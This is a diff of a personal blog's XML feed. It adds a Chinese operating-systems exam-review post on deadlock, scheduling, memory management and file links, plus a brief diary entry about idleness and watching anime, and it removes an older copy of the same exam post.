+<li><p>两个进程合作完成任务。在并发执行中，一个进程要等待其合作伙伴发来消息，或者建立某个条件后再向前执行，这种制约性合作关系被称为进程的（）<br>解析：<br>进程的同步（Synchronization）是解决进程间协作关系( 直接制约关系) 的手段。<br>进程同步指两个以上进程基于某个条件来协调它们的活动。一个进程的执行依赖于另一个协作进程的消息或信号，当一个进程没有得到来自于另一个进程的消息或信号时则需等待，直到消息或信号到达才被唤醒。<br>直接制约关系：指一个进程执行完后，另一个进程才能开始，否则不能开始。<br>答案：同步，选B</p>
+</li>
+<li><p>当每类资源只有一个个体时，下列说法不正确的是（）<br>A 有环必死锁 	B 死锁必有环 	C 有环不一定死锁 		D 被锁者一定全在环中<br>解析：<br>当每个资源类型只有一个实例，则有环等价于死锁。<br>当存在资源类型有多个实例，则死锁必有环，有环不一定死锁。<br>答案：选C</p>
+</li>
+<li><p>在现代操作系统中引入了（），从而使并发和共享成为了可能。<br>答案：多道程序，选D</p>
+</li>
+<li><p>设有3个作业，它们同时到达，运行时间分别为T1，T2和T3，且T1≤T2≤T3，若它们在单处理机系统中按单道运行，采用短作业优先调度算法，则平均周转时间为（）<br>解析：<br>周转时间是：程序从进入系统到完成的时间总量<br>因为是单道的，所以只能一个一个地执行，又是按照最短时间优先执行，因此，执行T1花费总时间是T1,执行T2花费总时间是T1+T2(T1是等待的时间)，执行T3花费的总时间是T1+T2+T3,(T1+T2)是等待的时间，故而，总的平均周转时间是三者之和除以三。<br>答案：T3/3+2*T2/3+T1，选D</p>
+</li>
+<li><p>若系统中有五台绘图仪，有多个进程均需要使用两台，规定每个进程一次仅允许申请一台，则至多允许（）个进程参与竞争，而不会发生死锁。<br>解析：<br>4个进程，当5个进程的时候如果都同时申请到了1台，就发生死锁了。如果是4个进程，那必然有一个能申请到2台，使资源能够得到释放。<br>答案：4，选D</p>
+</li>
+<li><p>CPU输出数据速度远远高于打印机的打印速度，为解决矛盾，可采用（）<br>解析：<br>覆盖技术和虚拟技术主要是解决内存不足的问题，当有大文件、程序需要在内存处理时，可以用到覆盖技术和虚拟技术，并行技术主要用于多核的 CPU 或者多 IO 总线上并行处理。<br>答案：缓冲技术，选B</p>
+</li>
+<li><p>为了允许不同用户的文件具有相同的文件名，通常在文件系统中采用（）<br>答案：多级目录，选B</p>
+</li>
+<li><p>在可变分区存储管理中，最优适应分配算法要求对空闲区表项按（）排列<br>解析：</p>
+</li>
+</ol>
+<ul>
+<li>首次适应算法：按照首址递增的方式来排序。这种方式的特点是：当用户查找空闲区表时，他是从低地址空间开始查找的，所以他是尽可能地先使用低地址空间。但需要较大分区时在高地址空间有较大的满足可能性。</li>
+<li>最佳适应法：按照大小递增的方式排序。这种方法的特点是：尽可能地先使用较小的空闲区，保留较大的空闲区。当需要较大分区时有较大的满足可能性。</li>
+<li>最坏适应法：空闲区表按大小递减排序。尽可能地先使用较大的空闲区，大空闲区分割后剩下部分还是很大，还能装下较大的程序。所以最坏适应法未必最坏。仅作一次查找就可以找到所要分区。<br>因此在最有适应分配算法中对空闲区表项是按照尺寸从小到大进行排序的。<br>答案：尺寸从小到大，选C</li>
+</ul>
+<ol start="18">
+<li><p>支持程序浮动地址转换机制是（）<br>解析：<br>主存储器是可以被处理器直接访问的，处理器是按绝对地址访问主存储器的。<br>为了使用户编制的程序能存放在主存储器的任意区域执行，用户使用逻辑地址编辑程序，即用户使用了逻辑上的主存储器。<br>存储管理必须为用户分配一个物理上的存储空间，于是，就有一个从逻辑空间到物理空间的转换问题。<br>具体地说，是要把逻辑地址转换成绝对地址，把这样的地址转换工作称为重定位。<br>重定位的方式可以有“静态重定位”和“动态重定位”。<br>静态重定位是指在装入一个作业时，把作业中的指令地址和数据地址全部转换成绝对地址。一旦装入则不能改变。<br>动态重定位是指在装入作业时，不进行地址转换，而是直接把作业装入到分配的主存区域中。在作业执行过程中，每当执行一条指令时都有硬件的地址转换机构将指令中的逻辑地址转换为绝对地址。<br>答案：动态重定位，选A</p>
+</li>
+<li><p>在可变式分区分配方案中，某一作业完成后，系统收回其主存空间，并与相邻空闲区合并，为此需修改空闲区表，造成空闲区数减1的情况是（）<br>解析：<br>无上邻空闲区，也无下邻空闲区：这时应该是空闲区数加 1<br>有上邻空闲区，但无下邻空闲区；有下邻空闲区，但无上邻空闲区：这时空闲区数不变<br>有下邻空闲区，也有上邻空闲区：这时空闲区数减 1<br>答案：有下邻空闲区，也有上邻空闲区。选D</p>
+</li>
+<li><p>在下面关于虚拟存储器的叙述中，正确的是（）<br>A 要求程序运行前必须全部装入内存且在运行过程中一直驻留在内存<br>B 要求程序运行前不必全部装入内存且在运行过程中不必一直驻留在内存<br>C 要求程序运行前不必全部装入内存但是在运行过程中必须一直驻留在内存<br>D 要求程序运行前必须全部装入内存但在运行过程中不必一直驻留在内存<br>解析：<br>虚拟存储器基于局部性原理，在程序运行时，可以将程序的一部分装入内存，而将其余部分留在外存，就可以启动程序执行。在程序执行过程中，当访问的信息不在内存时，由操作系统将所需的部分调入内存，然后继续执行。另一方面，操作系统将内存中暂时不使用的内容换出到外存上，从而腾出空间存放将要调入的信息。<br>答案：选B</p>
+</li>
+<li><p>文件系统中用（）管理文件。<br>解析：<br>文件系统属于操作系统中的一个重要组成部分，负责信息的组织、存储和访问，提供高效快速和方便访问功能。操作系统以文件方式管理计算机软件资源和被管理的文件和数据结构（目录、索引表等）的集合<br>选项A：进程控制块 用来管理进程，如程序计数器、进程状态、CPU暂存器、CPU排班法、存储器管理、输入输出状态等。<br>选项B：目录 实现文件的按名存取管理，系统中保存了海量文件需要组织管理，磁盘可以分为若干个分区，每个分区都包含了存储在分区中的文件的信息，这些信息保存在设备目录中。<br>选项C：外页表 是虚页号与实际地址的对应表，主要功能是实现虚地址到实地址的转化。<br>选项D：软硬件结合的方法 是笼统的计算机硬件和软件的结合，和本题意不太符合。<br>答案：目录，选D</p>
+</li>
+<li><p>在多进程的并发系统中，肯定不会因竞争（）而产生死锁。<br>解析：</p>
+</li>
+</ol>
+<ul>
+<li>竞争资源引起进程死锁<br>当系统中供多个进程共享的资源如打印机、公用队列的等，其数目不足以满足诸进程的需要时，会引起诸进程对资源的竞争而产生死锁。 </li>
+<li>可剥夺资源和不可剥夺资源<br>系统中的资源可以分为两类，一类是可剥夺资源，是指某进程在获得这类资源后，该资源可以再被其他进程或系统剥夺。例如，优先权高的进程可以剥夺优先权低的进程的处理机。又如，内存区可由存储器管理程序，把一个进程从一个存储区移到另一个存储区，此即剥夺了该进程原来占有的存储区，甚至可将一进程从内存调到外存上，可见，CPU和主存均属于可剥夺性资源，<strong>可剥夺资源不会产生死锁</strong>。另一类资源是不可剥夺资源，当系统把这类资源分配给某进程后，再不能强行收回，只能在进程用完后自行释放，如磁带机、打印机等。</li>
+<li>竞争不可剥夺资源<br>在系统中所配置的不可剥夺资源，由于它们的数量不能满足诸进程运行的需要，会使进程在运行过程中，因争夺这些资源而陷于僵局。例如，系统中只有一台打印机R1和一台磁带机R2，可供进程P1和P2共享。假定PI已占用了打印机R1，P2已占用了磁带机R2，若P2继续要求打印机R1，P2将阻塞；P1若又要求磁带机，P1也将阻塞。于是，在P1和P2之间就形成了僵局，两个进程都在等待对方释放自己所需要的资源，但是它们又都因不能继续获得自己所需要的资源而不能继续推进，从而也不能释放自己所占有的资源，以致进入死锁状态。 </li>
+<li>竞争临时资源<br>上面所说的打印机资源属于可顺序重复使用型资源，称为永久资源。还有一种所谓的临时资源，这是指由一个进程产生，被另一个进程使用，短时间后便无用的资源，故也称为消耗性资源，如硬件中断、信号、消息、缓冲区内的消息等，它也可能引起死锁。例如，SI，S2，S3是临时性资源，进程P1产生消息S1，又要求从P3接收消息S3；进程P3产生消息S3，又要求从进程P2处接收消息S2；进程P2产生消息S2，又要求从P1处接收产生的消息S1。如果消息通信按如下顺序进行：<br>P1: ···Relese（S1）；Request（S3）； ···<br>P2: ···Relese（S2）；Request（S1）； ···<br>P3: ···Relese（S3）；Request（S2）； ···<br>并不可能发生死锁。但若改成下述的运行顺序：<br>P1: ···Request（S3）；Relese（S1）；···<br>P2: ···Request（S1）；Relese（S2）； ···<br>P3: ···Request（S2）；Relese（S3）； ···<br>则可能发生死锁。</li>
+<li>进程推进顺序不当引起死锁<br>由于进程在运行中具有异步性特征，这可能使P1和P2两个进程按下述两种顺序向前推进。<br>1） 进程推进顺序合法<br>当进程P1和P2并发执行时，如果按照下述顺序推进：P1：Request（R1）； P1：Request（R2）； P1: Relese（R1）；P1: Relese（R2）； P2：Request（R2）； P2：Request（R1）； P2: Relese（R2）；P2: Relese（R1）；这两个进程便可顺利完成，这种不会引起进程死锁的推进顺序是合法的。<br>2） 进程推进顺序非法<br>若P1保持了资源R1,P2保持了资源R2，系统处于不安全状态，因为这两个进程再向前推进，便可能发生死锁。例如，当P1运行到P1：Request（R2）时，将因R2已被P2占用而阻塞；当P2运行到P2：Request（R1）时，也将因R1已被P1占用而阻塞，于是发生进程死锁。<br>答案：CPU，选C</li>
+</ul>
+<ol start="23">
+<li><p>程序员利用系统调用打开I&#x2F;O设备时，通常使用的设备标识（）<br>解析：<br>设备管理具有设备独立性的特点，操作系统以系统调用方式来请求某类设备时，使用的是逻辑设备名。而在程序实际执行时，将逻辑设备名转换为对应的物理设备名。<br>答案：逻辑设备名，选D</p>
+</li>
+<li><p>分段存储管理系统中，地址长度为32位，其中段号占8位，则段长最大（）<br>解析：<br>分段存储管理中，逻辑地址分为两部分，段号和段内位移，地址总长度为32位．段号占了8位，则剩下24位表示段内位移的，则最大段长为2^24字节。<br>答案：2^24字节，选C</p>
+</li>
+<li><p>设与某资源相关联的信号量初值为3，当前值为1，若M表示该资源的可用个数，N表示等待资源的进程数，则M，N分别是（）<br>解析：<br>信号量的初值表示系统中某类资源的数目，已知为3；<br>信号量的值小于等于0时，表示该类资源已分配完毕，此时信号量的绝对值表示在该信号量链表中已阻塞进程的数目。<br>信号量的值大于0时，表示该类资源还没有完全分配完，此时信号量的值表示该资源的可用个数。<br>信号量的当前值为1，大于0，则M表示该资源的可用个数为1，N表示等待资源的进程数为0。<br>答案：1，0  选A</p>
+</li>
+<li><p>某计算机系统中有8台打印机，有K个进程竞争使用，每个进程最多需要3台打印机。该系统可能会发生死锁的K的最小值（）<br>解析：<br>由于每个进程最多需要3台打印机，总共有8台打印机。<br>当有3个进程竞争使用时，每个进程能分配打印机数分别为3，3，2。有进程能释放资源，不会发生死锁。<br>当有4个进程竞争使用时，每个进程能分配2台打印机，不足以释放资源，即发生死锁。<br>因此最小值为4。<br>总结：用系统资源n-1除以进程最多需要的资源数m-1得到的结果向下取整的结果为不发生死锁的最大进程数。<br>答案：4，选C</p>
+</li>
+<li><p>设文件F1当前引用计数值为1，先建立F1的符号链接文件F2，再建立F1的硬链接文件F3，然后删除F1。此时F2和F3的引用计数值分别是（）<br>解析：<br>硬链接，同时改变源文件和链接文件连接数（+1），其实是同一个文件，文件类型是普通文件。<br>软链接，也叫符号链接，创建新的链接文件，文件类型，链接文件（l），是一个全新的文件，相当于快捷方式，不改变源文件链接数。<br>答案：1，1。选C</p>
+</li>
+<li><p>当进程因时间片用完而让出处理机时，该进程应转变为（）状态。<br>解析：<br><strong>进程调度的时机</strong><br>进程调度发生的时机（也称为调度点）与进程的状态变化有直接的关系。回顾进程状态变化图，我们可以看到进程调度的时机直接与进程在运行态&lt;--&gt;退出态&#x2F;就绪态&#x2F;阻塞态的转变时机相关。简而言之，引起进程调度的时机可归结为以下几类：</p>
+</li>
+</ol>
+<ul>
+<li>正在执行的进程执行完毕，需要选择新的就绪进程执行。</li>
+<li>正在执行的进程调用相关系统调用（包括与I/O操作，同步互斥操作等相关的系统调用）导致需等待某事件发生或等待资源可用，从而将白己阻塞起来进入阻塞状态。</li>
+<li>正在执行的进程主动调用放弃CPU的系统调用，导致自己的状态为就绪态，且把自己重新放到就绪队列中。</li>
+<li>等待事件发生或资源可用的进程等待队列，从而导致进程从阻塞态回到就绪态，并可参与到调度中。</li>
+<li>正在执行的进程的时间片已经用完，致自己的状态为就绪态，且把自己重新放到就绪队列中。</li>
+<li>在执行完系统调用后准备返回用户进程前的时刻，可调度选择一新用户进程执行</li>
+<li>就绪队列中某进程的优先级变得高于当前执行进程的优先级，从而也将引发进程调度。</li>
+<li>有序列表内容<br>答案：就绪，选B</li>
+</ul>
+<ol start="29">
+<li><p>文件的保密是指防止文件被（）<br>解析：<br>文件的保护:防止文件被破坏。<br>文件的保密:防止文件被窃取。<br>答案：窃取，选C</p>
+</li>
+<li><p>为了允许不同用户的文件具有相通的文件名，通常在文件系统中采用（）<br>答案：多级目录，选B</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>OS</category>
+        <category>习题</category>
+      </categories>
+      <tags>
+        <tag>OS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>空</title>
+    <url>/2023/08/02/Diary_20230802/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>无波澜。</p>
+<span id="more"></span>
+<h1 id="未强迫"><a href="#未强迫" class="headerlink" title="未强迫"></a>未强迫</h1><p>最近两天强迫力下降了，没有强迫自己写日记。<br>我也总是给自己找理由，没什么好写的之类的话。<br>不过即便没有什么值得记录的东西，这些时间也过去了。还是能想方设法写点东西的。</p>
+<h1 id="看"><a href="#看" class="headerlink" title="看"></a>看</h1><p>最近一直在看动漫。我也不知道为什么要这么做，似乎只是因为习惯了。没什么做的便看动漫，沉浸于一个个幻想世界。<br>看完了上世纪的 星际牛仔 ，看完了快20年前的 混沌武士 ，一直看啊看，对外界毫不关心。<br>留着胡子，每次遇到亲戚之类的，都会吐槽我。即便如此我也没有在意。</p>
+<h1 id="厌倦"><a href="#厌倦" class="headerlink" title="厌倦"></a>厌倦</h1><p>不知道这是不是厌倦现实世界了呢？总觉得有些消极，但或许又确实是这样。<br>我应该努力工作的，可我心底里总觉得那个时机还没到来。<br>我对天天看动漫，其实也有些厌倦了。可仍然还没让我有足够的动力改变。</p>
+<p>感觉自己是那种，要么做，要么不做的人。比较极端。学习工作与娱乐难以平衡。说起来我也不是那么在意平衡。</p>
+<h1 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h1><p>别人都在努力学习或是找工作之类的，我却驻足不前，丝毫没有干劲。能理解，但不是借口。</p>
+<p>那么，未来遭遇了困境，我也绝不要寻求帮助。<br>我有预感，未来会因我现在的懒散掉大坑里。<br>那么只要不是置于死亡的境地，一定不要找人帮忙，一定要品尝痛苦的滋味，来惩罚或者说，洗礼自己。<br>这是活该，也是必经之路。</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+        <tag>日志</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JS study record</title>
     <url>/2022/11/27/JS_study/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>只是对于JS学习的简单记录，以便于加强自身记忆。</p>
@@ -1575,119 +1708,6 @@ y 输出了 undefined，这是因为变量声明 (var y) 提升了，但是初�
       </tags>
   </entry>
   <entry>
-    <title>OS习题解析</title>
-    <url>/2022/12/08/OS%E4%B9%A0%E9%A2%98%E8%A7%A3%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为快到期末考试了，所以需要好好复习，争取考高分吧。</p>
-<span id="more"></span>
-<h1 id="习题解析"><a href="#习题解析" class="headerlink" title="习题解析"></a>习题解析</h1><ul>
-<li>说明：</li>
-</ul>
-<ol>
-<li>不是全部题，只写本人不会的以及需要思考的题。</li>
-<li>选择题不写选项，因为懒</li>
-<li>试卷来源于打印店</li>
-</ol>
-<h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><ol>
-<li><p>若处理器有32位地址，则它的虚拟地址空间为（）字节。<br>解析：<br>虚拟地址对应于物理存储空间的大小，因而可以虚拟出看起来很大的内存空间，这里虚拟地址的地址结构是：<br>31—页号—12—位移量w—0,这里的地址长度正好是操作系统的内存位数，所以可以知道最大寻址为2的32次方b,对应于kb,mb,gb的换算式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2^10b = 1kb</span><br><span class="line">2^20b = 1mb = 1kb*2^10</span><br><span class="line">2^30b = 1gb = 1mb*2^10</span><br><span class="line">这里2^32 = 2^2*1gb  = 4gb</span><br><span class="line">答案：4GB，选B</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>支持程序浮动的地址转换机制是（）<br>解析：<br>主存储器是可以被处理器直接访问的，处理器是按绝对地址访问主存储器的。<br>为了使用户编制的程序能存放在主存储器的任意区域执行，用户使用逻辑地址编辑程序，即用户使用了逻辑上的主存储器。存储管理必须为用户分配一个物理上的存储空间，于是，就有一个从逻辑空间到物理空间的转换问题。<br>具体地说，是要把逻辑地址转换成绝对地址，把这样的地址转换工作称为重定位。<br>重定位的方式可以有“静态重定位”和“动态重定位”。<br>静态重定位是指在装入一个作业时，把作业中的指令地址和数据地址全部转换成绝对地址。一旦装入则不能改变。<br>动态重定位是指在装入作业时，不进行地址转换，而是直接把作业装入到分配的主存区域中。在作业执行过程中，每当执行一条指令时都有硬件的地址转换机构将指令中的逻辑地址转换为绝对地址。<br>答案：动态重定位，选A</p>
-</li>
-<li><p>UNIX中的文件系统采用（）<br>解析：<br>按逻辑结构划分，Unix中的文件系统采用流式文件；而按物理结构划分，则是索引文件。<br>答案：流式文件，选D</p>
-</li>
-<li><p>段页式管理每取一数据，要访问（）次内存。<br>解析：<br>一般需要访问3次以上的内存：<br>第1次是由段表地址寄存器得段表始址后访问段表，由此取出对应段的页表在内存中的地址。<br>第2次则是访问页表得到所要访问的物理地址。<br>第3次才能访问真正需要访问的物理单元。<br>答案：3，选C</p>
-</li>
-<li><p>文件系统的主要目的是（）<br>解析：<br>文件系统是操作系统用来组织和管理存储设备或磁盘分区上的文件的数据结构和方法；即在存储设备上组织和 管理文件 的方法。 操作系统中负 责管理和存储文件信息的软件机构即为文件管理系统，简称为“文件系统”。文件系统主要由三部分组成：文件系统接口，对对象操纵还有管理的软件集合，对象及属性。<br>从操作系统的角度来看，文件系统是对文件存储设备的空间进行组织、分配，负责文件存储并且对存入的文件进行保护和检索的系统。<br>答案：实现对文件的按名存取，选A</p>
-</li>
-<li><p>某基于动态分区存储管理的计算机，其主存容量为55MB (初始为空闲)，采用最佳适配(Best Fit)算法，分配和释放的顺序为 ： 分配15MB ，分配30MB，释放15MB，分配8MB，分配6MB ，此时主存中最大空闲分区的大小是()<br>解析：<br>最佳适应算法（BF）：每次为作业分配内存时总是把能满足要求又是最小的空闲分区分配给作业。<br>其主存容量为55mb(初试为空间)，<br>第一步分配15MB以后还有55MB－15MB＝40MB，<br>第二步分配30MB以后还有 40MB－30MB＝10MB，<br>第三步释放15MB以后有两个空闲区15MB，10MB，<br>第四步分配8MB，则空闲区为15MB，2MB，<br>第五步分配 6MB，则空闲区为9MB，2MB。<br>答案：9MB，选B</p>
-</li>
-<li><p>设计批处理多道系统时，首先要考虑的是（）<br>解析：<br>多道批处理系统：<br>优点：资源利用率大幅提升，系统吞吐量增大<br>缺点：用户响应时间长，没有交互功能。<br>答案：系统效率和吞吐量，选B</p>
-</li>
-<li><p>进程调度的对象和任务分别是（）<br>解析：<br>CPU调度与执行的基本对象应该为线程。而不是作业。没有从后备作业中选定调度策略上CPU这种说法，进程应该是从就绪状态通过分配内存并调度进入CPU执行状态的。<br>答案：进程，从就绪队列中按一定的调度策略选择一个作业占用CPU。 选C</p>
-</li>
-<li><p>一种既有利于短小作业又兼顾到长作业的作业调度算法是（）<br>解析：<br>最高响应比优先算法等待时间相同时，要求服务时间愈短，优先权愈高，因而该算法有利于短作业；<br>对于长作业，作业的优先级可以随等待时间的增加而提高，当其等待时间足够长时，其优先级便可升到很高，从而获得处理机。<br>因此该算法即有利于短作业又兼顾到了长作业。<br>答案：最高响应比优先，选C</p>
-</li>
-<li><p>两个进程合作完成任务。在并发执行中，一个进程要等待其合作伙伴发来消息，或者建立某个条件后再向前执行，这种制约性合作关系被称为进程的（）<br>解析：<br>进程的同步（Synchronization）是解决进程间协作关系( 直接制约关系) 的手段。<br>进程同步指两个以上进程基于某个条件来协调它们的活动。一个进程的执行依赖于另一个协作进程的消息或信号，当一个进程没有得到来自于另一个进程的消息或信号时则需等待，直到消息或信号到达才被唤醒。<br>直接制约关系：指一个进程执行完后，另一个进程才能开始，否则不能开始。<br>答案：同步，选B</p>
-</li>
-<li><p>当每类资源只有一个个体时，下列说法不正确的是（）<br>A 有环必死锁 	B 死锁必有环 	C 有环不一定死锁 		D 被锁者一定全在环中<br>解析：<br>当每个资源类型只有一个实例，则有环等价于死锁。<br>当存在资源类型有多个实例，则死锁必有环，有环不一定死锁。<br>答案：选C</p>
-</li>
-<li><p>在现代操作系统中引入了（），从而使并发和共享成为了可能。<br>答案：多道程序，选D</p>
-</li>
-<li><p>设有3个作业，它们同时到达，运行时间分别为T1，T2和T3，且T1≤T2≤T3，若它们在单处理机系统中按单道运行，采用短作业优先调度算法，则平均周转时间为（）<br>解析：<br>周转时间是：程序从进入系统到完成的时间总量<br>因为是单道的，所以只能一个一个地执行，又是按照最短时间优先执行，因此，执行T1花费总时间是T1,执行T2花费总时间是T1+T2(T1是等待的时间)，执行T3花费的总时间是T1+T2+T3,(T1+T2)是等待的时间，故而，总的平均周转时间是三者之和除以三。<br>答案：T3/3+2*T2/3+T1，选D</p>
-</li>
-<li><p>若系统中有五台绘图仪，有多个进程均需要使用两台，规定每个进程一次仅允许申请一台，则至多允许（）个进程参与竞争，而不会发生死锁。<br>解析：<br>4个进程，当5个进程的时候如果都同时申请到了1台，就发生死锁了。如果是4个进程，那必然有一个能申请到2台，使资源能够得到释放。<br>答案：4，选D</p>
-</li>
-<li><p>CPU输出数据速度远远高于打印机的打印速度，为解决矛盾，可采用（）<br>解析：<br>覆盖技术和虚拟技术主要是解决内存不足的问题，当有大文件、程序需要在内存处理时，可以用到覆盖技术和虚拟技术，并行技术主要用于多核的 CPU 或者多 IO 总线上并行处理。<br>答案：缓冲技术，选B</p>
-</li>
-<li><p>为了允许不同用户的文件具有相同的文件名，通常在文件系统中采用（）<br>答案：多级目录，选B</p>
-</li>
-<li><p>在可变分区存储管理中，最优适应分配算法要求对空闲区表项按（）排列<br>解析：</p>
-</li>
-</ol>
-<ul>
-<li>首次适应算法：按照首址递增的方式来排序。这种方式的特点是：当用户查找空闲区表时，他是从低地址空间开始查找的，所以他是尽可能地先使用低地址空间。但需要较大分区时在高地址空间有较大的满足可能性。</li>
-<li>最佳适应法：按照大小递增的方式排序。这种方法的特点是：尽可能地先使用较小的空闲区，保留较大的空闲区。当需要较大分区时有较大的满足可能性。</li>
-<li>最坏适应法：空闲区表按大小递减排序。尽可能地先使用较大的空闲区，大空闲区分割后剩下部分还是很大，还能装下较大的程序。所以最坏适应法未必最坏。仅作一次查找就可以找到所要分区。<br>因此在最有适应分配算法中对空闲区表项是按照尺寸从小到大进行排序的。<br>答案：尺寸从小到大，选C</li>
-</ul>
-<ol start="18">
-<li><p>支持程序浮动地址转换机制是（）<br>解析：<br>主存储器是可以被处理器直接访问的，处理器是按绝对地址访问主存储器的。<br>为了使用户编制的程序能存放在主存储器的任意区域执行，用户使用逻辑地址编辑程序，即用户使用了逻辑上的主存储器。<br>存储管理必须为用户分配一个物理上的存储空间，于是，就有一个从逻辑空间到物理空间的转换问题。<br>具体地说，是要把逻辑地址转换成绝对地址，把这样的地址转换工作称为重定位。<br>重定位的方式可以有“静态重定位”和“动态重定位”。<br>静态重定位是指在装入一个作业时，把作业中的指令地址和数据地址全部转换成绝对地址。一旦装入则不能改变。<br>动态重定位是指在装入作业时，不进行地址转换，而是直接把作业装入到分配的主存区域中。在作业执行过程中，每当执行一条指令时都有硬件的地址转换机构将指令中的逻辑地址转换为绝对地址。<br>答案：动态重定位，选A</p>
-</li>
-<li><p>在可变式分区分配方案中，某一作业完成后，系统收回其主存空间，并与相邻空闲区合并，为此需修改空闲区表，造成空闲区数减1的情况是（）<br>解析：<br>无上邻空闲区，也无下邻空闲区：这时应该是空闲区数加 1<br>有上邻空闲区，但无下邻空闲区；有下邻空闲区，但无上邻空闲区：这时空闲区数不变<br>有下邻空闲区，也有上邻空闲区：这时空闲区数减 1<br>答案：有下邻空闲区，也有上邻空闲区。选D</p>
-</li>
-<li><p>在下面关于虚拟存储器的叙述中，正确的是（）<br>A 要求程序运行前必须全部装入内存且在运行过程中一直驻留在内存<br>B 要求程序运行前不必全部装入内存且在运行过程中不必一直驻留在内存<br>C 要求程序运行前不必全部装入内存但是在运行过程中必须一直驻留在内存<br>D 要求程序运行前必须全部装入内存但在运行过程中不必一直驻留在内存<br>解析：<br>虚拟存储器基于局部性原理，在程序运行时，可以将程序的一部分装入内存，而将其余部分留在外存，就可以启动程序执行。在程序执行过程中，当访问的信息不在内存时，由操作系统将所需的部分调入内存，然后继续执行。另一方面，操作系统将内存中暂时不使用的内容换出到外存上，从而腾出空间存放将要调入的信息。<br>答案：选B</p>
-</li>
-<li><p>文件系统中用（）管理文件。<br>解析：<br>文件系统属于操作系统中的一个重要组成部分，负责信息的组织、存储和访问，提供高效快速和方便访问功能。操作系统以文件方式管理计算机软件资源和被管理的文件和数据结构（目录、索引表等）的集合<br>选项A：进程控制块 用来管理进程，如程序计数器、进程状态、CPU暂存器、CPU排班法、存储器管理、输入输出状态等。<br>选项B：目录 实现文件的按名存取管理，系统中保存了海量文件需要组织管理，磁盘可以分为若干个分区，每个分区都包含了存储在分区中的文件的信息，这些信息保存在设备目录中。<br>选项C：外页表 是虚页号与实际地址的对应表，主要功能是实现虚地址到实地址的转化。<br>选项D：软硬件结合的方法 是笼统的计算机硬件和软件的结合，和本题意不太符合。<br>答案：目录，选D</p>
-</li>
-<li><p>在多进程的并发系统中，肯定不会因竞争（）而产生死锁。<br>解析：</p>
-</li>
-</ol>
-<ul>
-<li>竞争资源引起进程死锁<br>当系统中供多个进程共享的资源如打印机、公用队列的等，其数目不足以满足诸进程的需要时，会引起诸进程对资源的竞争而产生死锁。 </li>
-<li>可剥夺资源和不可剥夺资源<br>系统中的资源可以分为两类，一类是可剥夺资源，是指某进程在获得这类资源后，该资源可以再被其他进程或系统剥夺。例如，优先权高的进程可以剥夺优先权低的进程的处理机。又如，内存区可由存储器管理程序，把一个进程从一个存储区移到另一个存储区，此即剥夺了该进程原来占有的存储区，甚至可将一进程从内存调到外存上，可见，CPU和主存均属于可剥夺性资源，<strong>可剥夺资源不会产生死锁</strong>。另一类资源是不可剥夺资源，当系统把这类资源分配给某进程后，再不能强行收回，只能在进程用完后自行释放，如磁带机、打印机等。</li>
-<li>竞争不可剥夺资源<br>在系统中所配置的不可剥夺资源，由于它们的数量不能满足诸进程运行的需要，会使进程在运行过程中，因争夺这些资源而陷于僵局。例如，系统中只有一台打印机R1和一台磁带机R2，可供进程P1和P2共享。假定PI已占用了打印机R1，P2已占用了磁带机R2，若P2继续要求打印机R1，P2将阻塞；P1若又要求磁带机，P1也将阻塞。于是，在P1和P2之间就形成了僵局，两个进程都在等待对方释放自己所需要的资源，但是它们又都因不能继续获得自己所需要的资源而不能继续推进，从而也不能释放自己所占有的资源，以致进入死锁状态。 </li>
-<li>竞争临时资源<br>上面所说的打印机资源属于可顺序重复使用型资源，称为永久资源。还有一种所谓的临时资源，这是指由一个进程产生，被另一个进程使用，短时间后便无用的资源，故也称为消耗性资源，如硬件中断、信号、消息、缓冲区内的消息等，它也可能引起死锁。例如，SI，S2，S3是临时性资源，进程P1产生消息S1，又要求从P3接收消息S3；进程P3产生消息S3，又要求从进程P2处接收消息S2；进程P2产生消息S2，又要求从P1处接收产生的消息S1。如果消息通信按如下顺序进行：<br>P1: ···Relese（S1）；Request（S3）； ···<br>P2: ···Relese（S2）；Request（S1）； ···<br>P3: ···Relese（S3）；Request（S2）； ···<br>并不可能发生死锁。但若改成下述的运行顺序：<br>P1: ···Request（S3）；Relese（S1）；···<br>P2: ···Request（S1）；Relese（S2）； ···<br>P3: ···Request（S2）；Relese（S3）； ···<br>则可能发生死锁。</li>
-<li>进程推进顺序不当引起死锁<br>由于进程在运行中具有异步性特征，这可能使P1和P2两个进程按下述两种顺序向前推进。<br>1） 进程推进顺序合法<br>当进程P1和P2并发执行时，如果按照下述顺序推进：P1：Request（R1）； P1：Request（R2）； P1: Relese（R1）；P1: Relese（R2）； P2：Request（R2）； P2：Request（R1）； P2: Relese（R2）；P2: Relese（R1）；这两个进程便可顺利完成，这种不会引起进程死锁的推进顺序是合法的。<br>2） 进程推进顺序非法<br>若P1保持了资源R1,P2保持了资源R2，系统处于不安全状态，因为这两个进程再向前推进，便可能发生死锁。例如，当P1运行到P1：Request（R2）时，将因R2已被P2占用而阻塞；当P2运行到P2：Request（R1）时，也将因R1已被P1占用而阻塞，于是发生进程死锁。<br>答案：CPU，选C</li>
-</ul>
-<ol start="23">
-<li><p>程序员利用系统调用打开I&#x2F;O设备时，通常使用的设备标识（）<br>解析：<br>设备管理具有设备独立性的特点，操作系统以系统调用方式来请求某类设备时，使用的是逻辑设备名。而在程序实际执行时，将逻辑设备名转换为对应的物理设备名。<br>答案：逻辑设备名，选D</p>
-</li>
-<li><p>分段存储管理系统中，地址长度为32位，其中段号占8位，则段长最大（）<br>解析：<br>分段存储管理中，逻辑地址分为两部分，段号和段内位移，地址总长度为32位．段号占了8位，则剩下24位表示段内位移的，则最大段长为2^24字节。<br>答案：2^24字节，选C</p>
-</li>
